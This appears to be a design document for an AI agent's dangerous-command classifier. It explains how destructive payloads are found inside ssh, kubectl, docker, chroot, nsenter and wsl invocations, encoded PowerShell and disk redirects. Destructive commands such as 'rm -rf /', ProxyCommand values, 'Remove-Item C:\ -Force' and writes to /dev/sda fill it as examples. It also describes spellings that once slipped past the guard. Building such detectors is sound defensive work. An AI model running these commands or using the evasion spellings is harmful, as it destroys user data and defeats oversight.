- `containerlessOptions` names options that stand in for the first positional rather than sit beside it. `podman exec` is the only carrier with this shape. It normally takes a container name as its first bare word. But `--latest` and `--cidfile` both are that name, so `podman exec --latest rm -rf /` has a command and no operand. A read with one positional puts `rm` first and finds no command at all. That is the quiet side of a line that really does run.
- `valueOptions` names the options that swallow the word after them, such as `SSH_VALUE_OPTIONS`.
- `localCommandOptions` names `-o` values whose text after the `=` is a command line run on this machine. `ProxyCommand` is the only one, and it runs before the destination is resolved.
- `mandatorySeparator` marks the `kubectl exec` shape, where the payload starts after a `--` and there is no payload without one.

The `mandatorySeparator` comment carries the argument from source. `kubectl exec.go:243-249` takes the command from `argsIn[argsLenAtDash:]` only when `argsLenAtDash` is 0 or 1, and otherwise rejects a line with more than one bare word. pflag initialises `argsLenAtDash` to `-1` and assigns it only inside the branch that reads a literal `--`. So with no `--` the value is `-1`, and `kubectl exec pod rm -rf /` never reaches a container. A rule on that spelling is a rule for a command that cannot run, which is the wrong kind of right. The anchor is also what makes the option set before it irrelevant. So the twenty-odd kubectl globals that take a value (`k8s.io/cli-runtime/pkg/genericclioptions/config_flags.go:374-440`) do not have to be copied into this file and cannot go stale.

#### The ssh rows

`SSH_VALUE_OPTIONS` (`packages/agent/src/dangerous-command.ts:217`) holds the twenty-one `ssh` options that take the next word, read from the usage block of `ssh --help` on OpenSSH 10.2p1: `-B, -b, -c, -D, -E, -e, -F, -I, -i, -J, -L, -l, -m, -O, -o, -P, -p, -R, -S, -W, -w`. Everything else in the bracketed cluster (`-4, -6, -A, -a, -C, -f, -G, -g, -K, -k, -M, -N, -n, -q, -s, -T, -t, -V, -v, -X, -x, -Y, -y`) takes no value, so the list is the complement of that cluster rather than a guess.

`-D` is the one that looks optional in the usage line and is not. The brackets are around the bind address inside the one argument, and `ssh -G -D` answers `ssh: option requires an argument -- D`. The measurement used `-G`, which prints the resolved configuration and connects to nothing. So each test settles whether the destination is still found after the option. `-D 1080 host` prints `hostname host`. `-D host` answers `Bad dynamic forwarding specification 'example.com'`, so the parse refuses rather than swallows the destination in silence.

`-Q` takes a value and is deliberately not in the set. The usage output has a second synopsis line, `ssh [-Q query_option]`, and the notes above cover the first one. That is the whole of the omission. It was a completeness claim rather than a guess: `the list is the complement of that cluster` is true of the bracketed cluster. It quietly reads as true of the usage output, which is not the same thing. Measured on OpenSSH 10.2p1: bare `ssh -Q` answers `ssh: option requires an argument -- Q` and exits 255, so it is an ordinary required-argument option.

A rule for `-Q` in the set is a false positive rather than a miss. That reason is worth a note, because `"harmless" is not the same as "worth adding"`. `-Q` answers the query and exits before the destination is resolved at all. `ssh -Q cipher 127.0.0.1 rm -rf /tmp/x` exits 0 and runs nothing. `ssh -G -Q cipher 127.0.0.1` prints the cipher list and no `hostname` line, so it never reached config resolution. A rule on a line that cannot run is the wrong kind of right. The counterweight rows in the test file take the same posture for `nerdctl exec --detach-keys`. An unknown `-Q` costs the table nothing either: it is skipped as a flag, and the destination is still the one positional.

`ProxyCommand` is the one option whose value is a command. ssh runs it to reach the host, so it runs whatever is in it whether or not the connection succeeds. The measurement used a marker file that only the value itself can write. `ssh -o "ProxyCommand=touch /tmp/pc1" -o ConnectTimeout=1 127.0.0.1` writes it. The same line without the option never reaches a proxy command at all. The failure changes from `connect to host 127.0.0.1 port 22: Connection timed out` to `Connection closed by UNKNOWN port 65535`.

The value is a program and its arguments, not a shell line. `ProxyCommand=touch /tmp/pc1 /tmp/pc2` writes both files, and `ProxyCommand=touch /tmp/pc1 && echo x > /tmp/pc2` writes only the first, because the `&&` is an argument and not an operator. So the value is tokenized as argv and read with this file's own rules, which is exactly what ssh does. A read through `matchScript` splits on `&&` and reads the tail as a second command that ssh never runs.

Only a value that arrives as one token is read, and both sigils deliver that. `-o "ProxyCommand=touch /tmp/pc1"` and `-oProxyCommand="touch /tmp/pc1"` are the same value with the sigil separated or glued, and both run it. Both are measured by the marker file. A glued sigil with an unquoted single word is not a carrier: `ssh -oProxyCommand=touch /tmp/pc2 …` leaves `proxycommand touch` and makes `/tmp/pc2` the destination per `ssh -G`. That is also why this reads a value token rather than a run of words. `ssh -G -oProxyCommand=rm -rf / host` answers `ssh: unknown option -- r` with exit 255 and never connects. So the line that looks like a glued delete is a line ssh refuses. The reader is `sshLocalCommandOption` (`packages/agent/src/dangerous-command.ts:267`), a regex on `^ProxyCommand=(.+)$` with the case folded.

#### The other carrier rows

`chroot` carries GNU coreutils grammar with two value options, `--groups` and `--userspec` (`src/chroot.c:54-62`), and no short options at all. The getopt string at `:243` is `"+"` and nothing more. The carrier comment separates the grammar from the containment, and both halves are needed. On the grammar, `chroot /newroot` with no command runs `$SHELL -i` inside the new root (`chroot.c:336-345`). The jail is the part that the coreutils citation can be read to suggest. On win32 it is not there. Measured on the development machine: `/usr/bin/chroot` is a PE32+ MS Windows executable of 43648 bytes, an MSYS2 program rather than a native binary. `chroot --version` reports GNU coreutils 8.32, so its root is a userspace emulation. The probe that decides it is a process outside that emulation. A native `findstr.exe` copied into a new root and launched from inside `chroot` read a file outside that root by Win32 absolute path. It printed the contents and exited 0. Nothing outside the root refused. Win32 has no `chroot` call to bind it. Two probes that seem to support the false version must not be cited with the one above. `chroot / pwd` prints `/`, and `chroot $NEWROOT /bin/pwd` prints the same. MSYS emulates the root for MSYS programs. A discriminator has to be something the emulation does not cover. On posix, `chroot(2)` is a kernel call and the rule does buy a jail.

Bare `chroot /newroot`, and `nsenter -t 1` with no command (`nsenter.c:1036`), are deliberately quiet. The same table treats `sudo -i`, `su -` and `sudo bash` as quiet for that reason. An interactive shell with no command line on it is not one of the commands this file looks for. A rule on the bare spelling fires on `chroot /newroot ls`, the ordinary harmless use, along with everything else an operator types.

`nsenter` takes no positional: the command is the first bare word. `NSENTER_VALUE_OPTIONS` (`packages/agent/src/dangerous-command.ts:278`) holds `-t`, `--target`, `-N`, `--net-socket`, `-S`, `--setuid` and `-G`, `--setgid`, read from `sys-utils/nsenter.c:689`. The distinction that matters is between one colon and two in the getopt string. It decides whether the word after the flag is that flag's value or the command. Only those four shorts carry a single colon. Every other flag with an argument carries a double colon and takes it glued or after `=`. The long table at `:635-649` agrees. `--target`, `--net-socket`, `--setuid` and `--setgid` are `required_argument`. `--mount`, `--uts`, `--ipc`, `--net`, `--pid`, `--user`, `--cgroup`, `--time`, `--root`, `--wd` and `--wdns` are `optional_argument`. A list of one of the optional ones is a miss dressed as a rule. `nsenter -W rm -rf /` has no `-W` value, so a scanner that believed otherwise reads `rm` as the value, `-rf /` as the command, and finds nothing in it.

`systemd-run` also takes no positional. Its option table is a macro list in which the metavar field is the arity. `src/shared/options.c` defines `option_takes_arg` from the metavar character rather than from a declared type. `-H`/`--host` and `-M`/`--machine` are the same options as machinectl's, declared at `src/shared/options.h:138-142`. `src/run/run.c:779` runs a second parser for `run0`, where `-u` means `--user` while on `systemd-run` it means `--unit`. This set is that table read out of `run.c`, not transcribed from the manual. It was extracted by line range rather than by search, because `run.c` holds two tables and they disagree. The names `area`, `chdir`, `group`, `lightweight`, `machine`, `shell-prompt-prefix` and `user` are `run0`'s alone and are deliberately absent rather than guessed.

The four carriers added with the option citations each end the option scan at the first bare word. So the command starts there, and every word after it is an argument, the same shape `ssh` has. The sources are `src/chroot.c:243` and `:276-282` (getopt `"+"`, `argv[optind]` is the root, `argv += optind + 1` starts the command). `sys-utils/nsenter.c:689` and `:1032-1034` (getopt `"+"`, then `execvp(argv[optind], argv + optind)`) are the same shape. So is `src/run/run.c:203` (`OPTION_PARSER_STOP_AT_FIRST_NONOPTION`, documented at `src/shared/options.h:196-197` as `only parse options before the first positional argument`), with `.argspec = "COMMAND [ARGUMENTS…]"` at `run.c:150`. Those citations fix the grammar and nothing else. A read of the words after the destination as a command line is a parse, not a run. It does not depend on whether the `ssh` or `chroot` or `nsenter` described is the one on `PATH`. It does not claim to confine anything.

Two of the entries want that said outright. "It runs that command line over there" is easy to read as "and only over there". `chroot` is the sharpest. On win32 the `chroot` on `PATH` is an MSYS2 program that imposes no kernel-level root at all. There the rule is about command-line recognition and nothing else. The measurements and the two probes that do not discriminate are written out at that entry rather than here. The others do confine in the ordinary case and are left alone. `ssh` names a host. `systemd-run` and `nsenter` put the command in a unit or a namespace. That unit or namespace belongs to another program that is up at the time, systemd or a container runtime. That is not this file to decide.

`oc exec` and `oc run` are the same commands as their kubectl spellings, not lookalikes: `openshift/oc/pkg/cli/kubectlwrappers/wrappers.go:124-127` returns `cmdutil.ReplaceCommandName("kubectl", "oc", templates.Normalize(exec.NewCmdExec(f, streams)))`, and `:159-163` does the same for `run`. The grammar is the same and only the program name in the usage strings differs. `oc`'s own global flags are a separate list layered on top, and the cost of a missed one is written at the kubectl table.

`kubectl run` is the one case where the `--` is not mandatory. `run.go:293-295` rejects only `len(args) == 0 || o.ArgsLenAtDash == 0`, and a line with no `--` leaves `ArgsLenAtDash` at `-1`, which is neither. The words are then taken at `run.go:327-330` (`name := args[0]`, `arguments = args[1:]`) and land in the container at `run.go:635-640`. So the payload is everything after the NAME, and an anchor on a separator that need not be there misses the spelling that works. `--image` is `MarkFlagRequired` (`krun.go:196`), so the flag set is on every invocation that reaches the payload at all. This row once carried an empty value set and was a live miss. `kubectl run x --image nginx rm -rf /` counted `nginx` as a second operand and read the command as `nginx rm -rf /`. `--filename`/`-f` are not in `KUBECTL_RUN_VALUE_OPTIONS` because `run` does not register them. `krun.go:181-182` calls `MarkDeprecated("filename", …)` on a flag that does not exist and discards the error with `_ =`.

The container engines all take one positional before the command. For the plain spellings it is the container, and for compose it is the service. All these carriers set `SetInterspersed(false)`, so everything from the first bare word onward is the command and its arguments. Two rows carry the measured grammar:

- `docker exec` needs no `--` and `kubectl exec` needs one. `dexec.go:49` is `cli.RequiresMinArgs(2)` with `options.Command = args[1:]` at `:52`, so `docker exec ctr rm -rf /` runs, while `exec.go:243-249` rejects `kubectl exec pod rm -rf /` outright. A read of both the same way has to choose, and either choice misses one of them.
- `docker container exec` is not a lookalike. `cli/command/container/cmd.go:53` adds the same `newExecCommand` to the `container` parent that `cmd.go:12` registers at the top level. So both spellings share one constructor, one flag set and one argument rule. The three-word key is what reaches it.

`docker compose run` is the same one-positional shape, with the service in the operand's place. `run.go:171` is `options.Service = args[0]` with `options.Command = args[1:]` at `:173`, and `SetInterspersed(false)` at `:256`. It is reachable only when the subcommand is the first word after `compose`. Compose's project-wide flags (`--profile`, `-f`/`--file`, `-p`/`--project-name`) are attached to the root command's local set. The call site is `compose.go:577` (`opts.addProjectFlags(c.Flags())`, not `PersistentFlags()`). So cobra does not inherit them. `docker compose --profile x run web rm -rf /` is not a line this table can see, because `remote compose --profile` is not a key. That is a miss, recorded rather than papered over.

`docker run` is the same one-positional shape as `docker exec`, with the image in the place of the container. It has its own carrier mostly because its flag set is ninety-three entries long. Without that table, `docker run -e FOO=bar ubuntu rm -rf /` reads `FOO=bar` as the image and `ubuntu` as the head of the command. Then it is quiet on a line that runs. The plain `docker run ubuntu rm -rf /` was never at risk, which is why this is a miss and not a hole. `docker container run` shares the constructor, as with `exec` (`ccmd.go:11` and `:62`).

`podman exec` is the only carrier whose positional count is not a constant. `exec.go:227-236` reads the first bare word as the container unless `--latest` or `--cidfile` was given. `podman run` is the same shape against the image. `run.go:90-103` appends the same `runCommand` to the registry twice, once bare and once under `containerCmd`, and calls `runFlags` on each at `:95` and `:102`. `nerdctl run` comes from the same package as `nerdctl exec`: `container_run.go:67` is `Use: "run [flags] IMAGE [COMMAND] [ARG...]"` with `SetInterspersed(false)` at `:77`.

`limactl shell` takes the instance as its one positional, and `--instance` is that name. `shell.go:95-96` says `When --instance is specified, all positional args are treated as COMMAND`, and `:102-106` prepends a placeholder so the rest of the function is unchanged. That is the same `containerlessOptions` shape `podman exec --latest` has, for the same reason. The flag is hidden with `MarkHidden` at `shell.go:70`. `multipass exec` is `ssh` with the destination called a name. `exec.cpp:207` declares `<name>` as the first positional, and `:208-210` declares the rest as the command. `:60-61` copies everything past index zero into the argv it hands to the instance. It has one value option, `-d`/`--working-directory`, from `exec.cpp:212-214`.

`machinectl shell` has the same one-positional shape with the machine in the operand's place. `machinectl.c:1007-1008` is `VERB(verb_shell_machine, "shell", "[[USER@]NAME [COMMAND…]]\0", …)`, and `machinectl.c:1078` hands `argv + 2` to `OpenMachineShell` once there is more than a machine and one word. A rule on the bare spelling fires on the single most ordinary use of the command.

The hyphenated `docker-compose` is Compose V1, a Python binary whose docstrings are its parser. It is not the same program as the `docker compose` entries, which are the Go V2 plugin. It gets its own two entries and its own two tables because the two versions share a subcommand vocabulary and almost no flag surface. Both take the service as their one positional, exactly as `docker compose exec` and `run` do.

`wsl` is the one carrier with no positional at all. The first bare word is already the command, because the distribution is only ever named by a flag. Measured on WSL 2.4.13.0: `wsl Ubuntu echo M2` answers `/bin/bash: line 1: Ubuntu: command not found`, so `Ubuntu` became the first word of the command rather than a distro selector. Bare `wsl` and `wsl -d Ubuntu` with no command are quiet. WSL 2.4's own help says `if no command line is provided, wsl.exe will start the default shell`, which is an interactive session rather than one of the commands this file looks for.

The carriers paragraph has a corrections record of its own. It used to leave seven carriers open and made two wrong claims about them, both in the direction that costs a detection. It said `podman run`'s flags "live in `pkg/specgen` rather than in the command file". #### The kubectl run value-option table

`KUBECTL_RUN_VALUE_OPTIONS` (`packages/agent/src/dangerous-command.ts:329`) is the one table that is not a read-out of a single option list, because cobra assembles `run`'s flags from five places. Each source was read on its own, and the parts were not merged by name.

- `pkg/cmd/run/krun.go` `addRunFlags` (`krun.go:191-212`) gives `--annotations`, `--image`, `--image-pull-policy`, `--env`, `--port`, `-l/--labels`, `--restart`, `--detach-keys` and `--field-manager`.
- `pkg/cmd/util/override_options.go` (`override_options.go:50-51`) gives `--overrides` and `--override-type`.
- `pkg/cmd/util/helpers.go` (`helpers.go:517`) gives `--pod-running-timeout`.
- `cmddelete.DeleteFlags`, `PrintFlags` and `RecordFlags` (`krun.go:177-179`) give `--field-selector`, `--grace-period`, `--timeout`, `--raw` and `-o/--output`.
- `genericclioptions.ConfigFlags` (`config_flags.go:374-440`) gives the twenty global options.
- `component-base/logs`, reached through `cli.Run` (`cmd/kubectl/kubectl.go:40`, then `component-base/cli/run.go:117`, then `logs/logs.go:46-49`), gives `-v/--v`, `--vmodule` and `--log-flush-frequency`.
- `kubectl/pkg/cmd/profiling.go` (`kubectl/pkg/cmd/cmd.go:220`) gives `--profile` and `--profile-output`.

The literals of the `ConfigFlags` row are the resolved `const` block at `config_flags.go:42-62`, not the identifiers at the call sites. `flagBearerToken` is the string `token`. A copy of the identifier gives a `--bearer-token` that does not exist and drops the real one.

Two value-typed flags are deliberately absent, and each absence is the part that matters. `--dry-run` (`helpers.go:500`) and `--cascade` (`delete_flags.go:140`) are registered as strings, and each one then gets a `NoOptDefVal`. pflag v1.0.10 reads that as a flag that can appear with no value. `parseLongArg` (`flag.go:980+`) tests `flag.NoOptDefVal != ""` before it reaches the branch that takes the next word, and `parseSingleShortArg` does the same. So `kubectl run x --image nginx --dry-run rm -rf /` leaves `rm -rf /` as the payload. A table that believed `--dry-run` swallowed a word reads `-rf /` as the command and finds nothing in it. A flag's declared type is not its arity. The `NoOptDefVal` override decides it.

The word after such a flag is not discarded. `parseArgs` (`flag.go:1137`) files it under the positional arguments, so `kubectl run x --image nginx --cascade background rm -rf /` runs `background` as the container's `argv[0]` (`run.go:327-330`). That word is the head of the payload, and it matches nothing. That is why both flags are absent from the table, and both lines stay quiet.

The globals matter only in the order `kubectl run NAME [flags] COMMAND`, where they sit between the name and the command. A global before the verb (`kubectl -n foo run …`) builds the key `"kubectl -n"` and is not a carrier at all. That fact is recorded at `remoteCarrierFor`.

`--username` and `--password` are the one pair whose presence is conditional. `config_flags.go:397-402` registers them only inside `if f.Username != nil` and `if f.Password != nil`, and `NewConfigFlags` leaves both fields nil. So a caller that uses `WithDeprecatedPasswordFlag` is the only one that reaches them. Whether kubectl does that is not settled here. The entry stays anyway, because an unknown flag makes pflag stop before anything runs. A line that cannot run is not worth a rule either way.

The log globals arrive by a route that does not go through `ConfigFlags`. `-v` takes a value even though it reads like a level. kubectl's `main` calls `cli.RunNoErrOutput(command)` (`cmd/kubectl/kubectl.go:40`). `cli.Run` does `logs.AddFlags(cmd.PersistentFlags())` (`component-base/cli/run.go:117`). `logs.AddFlags` copies whatever is in `packageFlags` (`component-base/logs/logs.go:87-88`). `packageFlags` is built in that file's own `init()` from `klogflags.Init` plus exactly one `DurationVar` (`logs/logs.go:46-49`). `klogflags.Init` filters klog's own set through a switch on `"v"` and `"vmodule"` (`logs/klogflags/klogflags.go:36-38`). So `-v`, `--vmodule` and `--log-flush-frequency` are the whole of it. That is why `--log-text-split-stream`, `--log-text-info-buffer-size` and `--logging-format` are not here. `packageFlags` provably cannot hold them, whatever `logs/api/v1/options.go` registers for the parts that use it.

Why `-v` swallows the next word took two files to establish. `logs.AddFlags` hands each Go flag to `pflag.PFlagFromGoFlag` (`vendor/github.com/spf13/pflag/golangflag.go:74`), which gives any one-character name a shorthand of its own (`:85-86`). So `-v` and `--v` are one flag with two spellings, and both are listed. `NoOptDefVal` is set only when the wrapped value answers `IsBoolFlag()` (`:89`). klog's `severityValue` (`vendor/k8s.io/klog/v2/klog.go:137`) is a plain `flag.Value` with only `get`, `set`, `String`, `Get` and `Set`. So `NoOptDefVal` stays empty and pflag takes the next word.

What that cost is measured rather than argued. `kubectl run web -v 6 --image nginx rm -rf /` was quiet. `-v` matched nothing, so `6` fell through to the operand count as the second positional, and the payload was read as `6 --image nginx rm -rf /`. Its head word is `6`, so the line was missed rather than mis-attributed. The glued `-v6` was never affected, because there the level lives inside the flag token and nothing is left to mis-count. That asymmetry is the ordinary shape of the failure, and it is why the sigil arm exists.

`--profile` and `--profile-output` are plainer. `profiling.go:36-39` registers both with `StringVar`, and `cmd.go:218-220` adds them to the root command's `PersistentFlags()`, so `run` inherits them.

`oc`'s half of this table is kubectl's, and that is read rather than assumed. `["oc run"]` shares this set in `REMOTE_COMMAND_CARRIERS`, and OpenShift's `oc` is a separate codebase. An earlier comment said the `oc` half was not checked, and only kubectl's sources were behind the rows above. It is not a lookalike. `openshift/oc` `pkg/cli/kubectlwrappers/wrappers.go:160-161` runs `cmdutil.ReplaceCommandName("kubectl", "oc", templates.Normalize(run.NewCmdRun(f, streams)))`, and `run.NewCmdRun` is the `krun.go` that every row above was read out of. So the subcommand flag set is the same object with the usage strings renamed. The wrapper for `exec` is the same shape at `:124-127`.

What is still not covered is `oc`'s own root flags, which are a separate list layered on top of the shared constructor. A miss there costs a detection and nothing else. `remoteCommandScript` treats a flag it does not know as a flag either way, so an unlisted `oc` global cannot make a false positive. `oc --loglevel 6 run x --image nginx rm -rf /` has a global before the verb. No key in the carrier table can reach it, for the same reason `docker compose --profile` is out of reach.

The underscore spellings of every multi-word flag here are live and are deliberately not listed. kubectl sets a global normalizer twice: `cliflag.WarnWordSepNormalizeFunc` at `cmd.go:216`, then `cliflag.WordSepNormalizeFunc` at `:364`. The later call wins, so both rewrite `_` to `-` (`component-base/cli/flag/flags.go:30-35`, `:38-46`). `--image_pull_policy` reaches the same flag as `--image-pull-policy`, and this file reads it as an unknown flag. A list of every such pair doubles the table for spellings upstream calls "not supported" in its own warning text (`flags.go:42`), and nobody types them. The hyphen form is the documented one. This omission is deliberate, and the mechanism behind it is measured.

An incomplete table costs a missed detection and nothing else. Every way this table can go wrong makes the payload start at a word pflag did not skip. The scanner then reads a flag or a flag's value as the head word of the command. No spelling here makes one of these entries fire on something harmless.

#### Carrier lookup and payload reading

`remoteCarrierFor` (`packages/agent/src/dangerous-command.ts:1049`) tries the bare program first, then keys one word longer, then three words. Longest-first is not a choice. A one-word key that also existed wins, and the verb becomes unreachable. The three-word form is not speculative, because `docker container exec` and `docker compose exec` are both real spellings. The first shares its constructor with `docker exec`, so it is the same carrier under a longer key. It is not a second entry that can drift from it. A flag in second position is simply not a key. `kubectl -n kube-system get` builds the string `kubectl -n`, which no entry can be, and the lookup is what rejects it. An earlier version tested `verb.startsWith("-")` there, and a mutation of that test survived. With the current table, the two spellings cannot be told apart at all. That is why the reject is a lookup rather than a test.

`matchCarrierPayload` (`packages/agent/src/dangerous-command.ts:1076`) exists because a token list cannot say which of its words were one quoted argument. `sh -c 'rm -rf /'` arrives as one token that holds a space. A plain join gives `sh -c rm -rf /`, where the script body is the word `rm` and the rest is three inert arguments. That is why every carrier was quiet on `ssh host sh -c 'rm -rf /'` and on `chroot /newroot sh -c "rm -rf /"`, while the same line typed directly was not. A re-quote of the token on the way back does not work either, and was tried. It makes `tokenizeShell` hand the payload through whole, so the other read, `ssh host "rm -rf /var"`, where the single token is a command line, no longer matches. Neither string can carry both facts, because the facts are about tokenization and a string is read again. So both reads are taken and the first hit wins. The plain join comes first, so that a match found before this bug existed keeps the same rule it always reported. There is deliberately no `platform` parameter. The caller's platform is exactly the thing that is unknowable here, because the payload runs wherever the carrier sends it. A parameter there invites a future edit to filter on it and quietly halves what this finds.

The two stacked JSDoc blocks above `remoteCarrierFor` record how the two payload kinds are read, and they are read differently on purpose. The command after the destination runs on the remote, whose shell is not knowable from here, so it is read against both platforms. A read as POSIX alone misses `ssh fileserver "Remove-Item C:\ -Force"`, an ordinary line in a Windows shop. A read as Windows alone misses the far more common `ssh host "rm -rf /var"`. This is the rule a `cmd /c` body already follows: a body is read against every shell that can run it, never as `nothing here`. It costs a prompt on a payload that names a command the other platform does not have. A `ProxyCommand` value runs on this machine, so it is read once, as the platform this call was handed. A guess about the other shell there is a claim about this machine, which the code can read instead.

`remoteCommandScript` (`packages/agent/src/dangerous-command.ts:1086`) resolves a `--`-anchored carrier before the operand scan, not inside it. `kubectl exec -n kube-system pod -- rm -rf /` has three bare words before the separator. A loop that counts operands reaches `pod` and reads the command as `pod -- rm -rf /`. It never arrives at the `--`. The anchor at the front is also what makes the flags before the separator irrelevant. Only `--` matters, so the function never has to know whether `-n` swallows the word after it. No separator, or nothing after it, means no payload.

The operand loop carries four measured details:

- A `--` inside the operand region does not end the scan. pflag does end the option scan there, and `parseArgs` (`flag.go:1131-1135`) reads the separator, records `argsLenAtDash` and files the rest as positional. So a word past a `--` can never be a flag again. A faithful model of that was tried and reverted, because it costs detections rather than adds them. `docker exec web -- --user root sh -c 'rm -rf /'` is then read as the command `--user root sh -c 'rm -rf /'`, whose head word matches nothing. A skip of `--` carries on and finds `sh` and reads the script body behind `-c`. To read more of the payload is not the same as to classify more of it.
- Whether an option is the container is settled before whether it swallows the next word, because the two answers are independent. `--latest` stands in for the name and takes nothing. `--cidfile` stands in for the name and takes a value. Both spellings live in the set rather than one derived from the other. There is deliberately no sigil test here the way `valueOptions` has one. `--latest`'s shorthand is `-l` and it is a `Bool`, so unlike `-uroot` it has no glued form to catch. A sigil check only re-finds an entry the exact match already found. That is not a guess. A mutation that replaced the check with a sigil test survived, because `-l` is listed in the set and is caught above.
- A POSIX short option takes its value as the next word or glued to the sigil, and ssh accepts both: `-p 2222`, `-p2222`, `-o Foo=bar`, `-oFoo=bar`. A read of only the separated form makes `-p2222` look like a flag, and leaves `2222` to be counted as the destination. The command is then read as the destination. That is how a rule meant to catch `rm -rf /` ends up with the word `host` as its match.
- A quiet `-o` must not end the scan, because the rest of the line is still a remote command. A miss falls through rather than returns. The local value is read with `tokenizeShell` and not `matchScript`. The value is argv, and an operator inside it is an argument rather than a separator. A read through `matchScript` splits on `&&` and reads the tail as a second command that ssh never runs. That is a rule for a command that cannot run.

The count is `++positionals > carrier.positionals - (containerless ? 1 : 0)`, and the word after the last positional is the first word of the command. An option that stood in for the container is why the count is read there and not baked into the table. `podman exec --latest rm -rf /` has no operand at all, and `podman exec web rm -rf /` has exactly one.

### PowerShell switches and encoded commands

`powershell.exe` matches its own switches by prefix, longest match first, and the documented order stops a tie. That is why most prefixes of `-EncodedCommand` reach it even though `-ExecutionPolicy` is also an `E`. `-e` and `-en` match both at the same length, and `-EncodedCommand` is documented first. `-ex` diverges at the third character and reaches only `-ExecutionPolicy`, which is what makes it take the body as its own value.

`switchPrefixes` (`packages/agent/src/dangerous-command.ts:1167`) derives the set from the switch name under both sigils. The set holds every prefix from a shortest length to the full name, for `-` and for `/`. The set was measured rather than reasoned about. Reason alone gets two answers wrong. Each spelling was run against a `powershell.exe` on the development machine, on 5.1 and on 7.4. The test body was base64 and it wrote a marker file that only the body itself can write:

- `-e`, `-en`, `-enco`, `-encod`, `-encode`, `-encoded`, `-encodedc`, `-encodedco`, `-encodedcom`, `-encodedcomm`, `-encodedcomma`, `-encodedcomman` and `-encodedcommand` each ran it. That is thirteen of the fourteen prefixes, and every one of them but `-enc`.
- `-ec` ran it, in any case, and so did `/ec`. Neither is a prefix of anything here, so neither can come out of the derivation and both are listed by hand (`POWERSHELL_ENCODED_SWITCH`, `packages/agent/src/dangerous-command.ts:1180`).
- `-enc` did not run it, across three runs on each build. Each run waited for input until it was killed, while its immediate neighbours `-en` and `-enco` both ran it. `-eco`, `-ecom` and `-econd` did not run it either.
- `-ex`, `-exe`, `-exec`, `-execu`, `-executio`, `-executionp` and `-executionpolicy` each took the body as their own value and ran nothing.
- `-nop` takes no value, so the body became the command.

The accepted set is therefore every prefix of the name under both sigils, plus `-ec`, derived from the name rather than written out. The hand-kept list this replaces (`c|co|com|comm|comma|comman|command`) was exactly the prefixes of `command`. The derivation changes no answer and cannot drift when a switch is spelled differently.

The `/` sigil was measured the same way and is accepted. PowerShell takes `/` in front of a parameter name, the same as `-`. The marker file appeared for `/Command` and for `/EncodedCommand` on both builds. One call derives both sigils, and that is the point. `command` and `encodedcommand` each gain their `/` forms from the same loop that gives them their `-` forms. So a third spelling added here costs one line rather than a new list.

The `name:value` spelling is deliberately not accepted, and codex accepts it. Codex opens a body from `-command:` and from `/command:`. The marker measurement says both are inert here. On 5.1 and on 7.4, all four of `-command:`, `/command:`, `-encodedcommand:` and `/encodedcommand:` were refused as an unrecognised argument and wrote nothing. That is the same result `-ex` gives. Codex's arm classifies a command line that runs no body. A rule for a spelling the machine refuses is a claim the machine contradicts. If a build is ever found where a colon form binds, the place to add it is this function.

One spelling in the accepted set was measured not to run the body, `-enc`, and it stays in. A spelling that does not work costs one prompt too many. A drop of a spelling that does work on some build costs a destructive command that runs unsupervised. The two mistakes are not the same size. Nothing here explains why `-ec` binds, why `-enc` does not, or why `-enco` does. That is recorded rather than guessed at. A rule whose comment explains more than was measured is worse than a rule that says what it saw.

The `shortest` parameter exists for the one prefix-match rule PowerShell does not apply the same way. A parameter name binds only when it is unambiguous. So the prefixes below a shortest length have to be left out rather than included. `FORCE_PARAMETER_SPELLINGS` uses that.

`powershellScript` (`packages/agent/src/dangerous-command.ts:1184`) reads both switches out of an invocation. It checks the encoded switch first, then the command switch, and a command value of `-` or nothing returns nothing. The encoded half used to be a documented hole rather than a closed one. Its body is base64, and the comment claimed a miss was `"never treated as safe anywhere upstream"`. That was wrong, and `packages/agent/src/permissions.ts:327-331` says the opposite. An unrecognised command becomes an ordinary one, and an ordinary command with no deny rule is allowed in Agent mode. It was arbitrary code that ran behind a switch the classifier read as nothing.

`decodeEncodedCommand` (`packages/agent/src/dangerous-command.ts:1207`) reads the base64 of UTF-16LE, which is what `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))` produces and what every "here is a one-liner" post on the web copies verbatim. A decode is the whole point, because the body is ordinary PowerShell source and the rest of the file already knows how to read that.

`MAX_ENCODED_COMMAND_CHARS` is 64 times 1024. The largest body anyone writes by hand is a few kilobytes. A classifier that allocates whatever a number in a command line asks for is a denial of service with the shape of a rule.

A return of `undefined` for a body it cannot make sense of is the one case that stays a miss. Every one of those misses is about a decode rather than about shape. The host rejects an odd number of bytes, a body outside the base64 alphabet and a body that is not UTF-16LE. All three get the same error, and nothing runs. Measured: the body runs when its arguments are separated by spaces or by tabs, and does not run when they are separated by newlines. So a split on any whitespace errs towards a flag rather than towards a miss.

The function's steps each carry a reason. Whitespace is compacted away first. Base64 is whitespace-tolerant and PowerShell tolerates it too, so a body is not rejected for whitespace. The compact body must match `^[A-Za-z0-9+/]+={0,2}$`, and an empty body or one above the limit returns nothing. An odd byte count returns nothing, because a payload of odd length was not produced by the encoder above. UTF-8 is the only other text format anyone reaches for, and PowerShell does not read it here. Measured, because the other option was a comment that promised a catch that does not exist. The same `Remove-Item … -Force` command written as UTF-16LE ran on 5.1 and on 7.4 and wrote its marker file. The UTF-8 spelling of the same command wrote nothing on either. The zero-byte test runs on the bytes and not on the decoded text. UTF-16LE of ASCII puts a zero in the high half of every character. UTF-8 of the same text has no zero bytes at all. The first try looked for a NUL in the decoded string, which is nearly the same idea and almost never fires. A read of UTF-8 as UTF-16LE pairs two non-zero bytes and produces no NUL. That is how a UTF-8 body slipped past it. The one case this rule gives up is a body with no ASCII in it at all. A command with no ASCII in it cannot spell a name any rule here matches.

### POSIX disk rules

`posixDiskRules` (`packages/agent/src/dangerous-command.ts:2028`) covers two shapes. One is a program that writes a filesystem or a partition table. The other is a shell redirect aimed at a block device, and it needs no program at all. `> /dev/sda` after `echo` is enough, and so is `echo x >/dev/sda` with no space at all. The second spelling is why the rule reads the segment as text rather than as two words, the operator and its target. They do not have to be two words, and a rule that assumes they are two words misses the shorter spelling. `2>&1` yields no target, because nothing after the `>` begins with a slash, and `> /dev/null` yields one that is not a disk.

